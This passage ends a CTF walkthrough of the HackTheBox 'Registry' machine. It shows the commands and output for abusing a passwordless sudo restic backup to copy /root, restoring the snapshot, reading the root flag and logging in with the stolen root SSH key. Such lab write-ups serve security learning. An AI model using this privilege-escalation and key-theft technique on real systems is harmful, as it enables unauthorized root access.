+<p>Sounds all good for the repository! Let’s now try to backup the <code>/root/</code> folder to our backup repository using the <code>sudo</code> command we are allowed to run without password:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">www-data@bolt:/$ sudo /usr/bin/restic backup -r rest:http://localhost:8000 /root</span><br><span class="line">enter password <span class="keyword">for</span> repository:</span><br><span class="line">password is correct</span><br><span class="line">scanned 10 directories, 14 files <span class="keyword">in</span> 0:00</span><br><span class="line">[0:00] 100.00%  28.066 KiB / 28.066 KiB  24 / 24 items  0 errors  ETA 0:00</span><br><span class="line">duration: 0:00</span><br><span class="line">snapshot 0547cce5 saved</span><br></pre></td></tr></table></figure>
+
+<p><code>0 errors</code> that’s good! Now it’s time to access the file we just backup:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">bolt@bolt:/$  restic -r /tmp/hg8-backup/ snapshots</span><br><span class="line">enter password <span class="keyword">for</span> repository:</span><br><span class="line">password is correct</span><br><span class="line">ID        Date                 Host        Tags        Directory</span><br><span class="line">----------------------------------------------------------------------</span><br><span class="line">0547cce5  2020-01-28 11:51:15  bolt                    /root</span><br><span class="line">----------------------------------------------------------------------</span><br><span class="line">9 snapshots</span><br><span class="line"></span><br><span class="line">bolt@bolt:/$ restic -r /tmp/hg8-backup/ restore 0547cce5 --target /tmp/restored-root</span><br><span class="line">enter password <span class="keyword">for</span> repository:</span><br><span class="line">password is correct</span><br><span class="line">restoring &lt;Snapshot 0547cce5 of [/root] at 2020-01-28 11:51:15.656860319 +0000 UTC by root@bolt&gt; to /tmp/restored-root</span><br></pre></td></tr></table></figure>
+
+<p>All that remains to do now is retrieving our flag:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bolt@bolt:/tmp$ cat /tmp/restored-root/root/root.txt</span><br><span class="line">ntxxxxxxxxxxxxxxxxxxxxxxxxxxxgw</span><br></pre></td></tr></table></figure>
+
+<p>Looking around we can even find the <code>root</code> account private ssh key and use it to obtain a root shell:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">bolt@bolt:/$ ssh -i /tmp/restored-root/root/.ssh/id_rsa root@registry.htb</span><br><span class="line">Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-65-generic x86_64)</span><br><span class="line"></span><br><span class="line">  System information as of Tue Jan 28 11:55:43 UTC 2020</span><br><span class="line"></span><br><span class="line">  System load:  0.0               Users logged <span class="keyword">in</span>:                1</span><br><span class="line">  Usage of /:   5.6% of 61.80GB   IP address <span class="keyword">for</span> eth0:            10.10.10.159</span><br><span class="line">  Memory usage: 26%               IP address <span class="keyword">for</span> docker0:         172.17.0.1</span><br><span class="line">  Swap usage:   0%                IP address <span class="keyword">for</span> br-1bad9bd75d17: 172.18.0.1</span><br><span class="line">  Processes:    173</span><br><span class="line">Last login: Mon Oct 21 09:53:48 2019</span><br><span class="line">root@bolt:~<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<p>As always do not hesitate to contact me for any questions or feedbacks :)</p>
+<p>See you next time !</p>
+<p>-hg8</p>
+
+  </div>
+</article>
+<br>
+<br>
+
+
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/CTF/">CTF</a> › <a class="category-link" href="/categories/CTF/HackTheBox/">HackTheBox</a> › <a class="category-link" href="/categories/CTF/HackTheBox/linux/">linux</a>
+    </div>
+
+
+
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/docker/" rel="tag">docker</a>, <a class="tag-link" href="/tags/docker-registry/" rel="tag">docker-registry</a>, <a class="tag-link" href="/tags/enumeration/" rel="tag">enumeration</a>, <a class="tag-link" href="/tags/php/" rel="tag">php</a>, <a class="tag-link" href="/tags/registry/" rel="tag">registry</a>, <a class="tag-link" href="/tags/restic/" rel="tag">restic</a>, <a class="tag-link" href="/tags/shell-exec/" rel="tag">shell_exec</a>, <a class="tag-link" href="/tags/sudo/" rel="tag">sudo</a>, <a class="tag-link" href="/tags/webshell/" rel="tag">webshell</a>
+    </div>
+
+
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Posts</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#User-Flag"><span class="toc-number">1.</span> <span class="toc-text">User Flag</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Recon"><span class="toc-number">2.</span> <span class="toc-text">Recon</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Docker-Registry"><span class="toc-number">2.1.</span> <span class="toc-text">Docker Registry</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Root-Flag"><span class="toc-number">3.</span> <span class="toc-text">Root Flag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Recon-1"><span class="toc-number">3.1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pivot-bolt-gt-www-data"><span class="toc-number">3.2.</span> <span class="toc-text">Pivot bolt -&gt; www-data</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Restic-privileged-file-read"><span class="toc-number">3.3.</span> <span class="toc-text">Restic privileged file read</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://hg8.sh/registry/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://hg8.sh/registry/&text=HackTheBox - Registry" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://hg8.sh/registry/&title=HackTheBox - Registry" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://hg8.sh/registry/&is_video=false&description=HackTheBox - Registry" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HackTheBox - Registry&body=Check out this article: https://hg8.sh/registry/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://hg8.sh/registry/&title=HackTheBox - Registry" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://hg8.sh/registry/&title=HackTheBox - Registry" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://hg8.sh/registry/&title=HackTheBox - Registry" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://hg8.sh/registry/&title=HackTheBox - Registry" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://hg8.sh/registry/&name=HackTheBox - Registry&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://hg8.sh/registry/&t=HackTheBox - Registry" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2020
+    <a href="https://hg8.sh">hg8.sh</a>
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Posts</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
